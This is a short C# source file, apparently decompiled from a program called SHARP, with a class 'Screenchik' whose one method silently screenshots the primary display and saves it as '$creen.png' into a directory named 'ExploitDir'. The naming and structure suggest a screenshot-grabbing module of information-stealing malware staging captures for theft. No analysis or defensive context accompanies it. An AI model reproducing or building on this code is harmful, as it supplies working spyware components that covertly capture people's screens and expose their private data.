﻿using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace SHARP
{
	// Token: 0x02000062 RID: 98
	internal class Screenchik
	{
		// Token: 0x06000223 RID: 547 RVA: 0x0000D5D4 File Offset: 0x0000B7D4
		public static void GetScreen()
		{
			string exploitDir = Help.ExploitDir;
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Bitmap bitmap = new Bitmap(width, height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(exploitDir + "\\$creen.png", ImageFormat.Png);
		}
	}
}
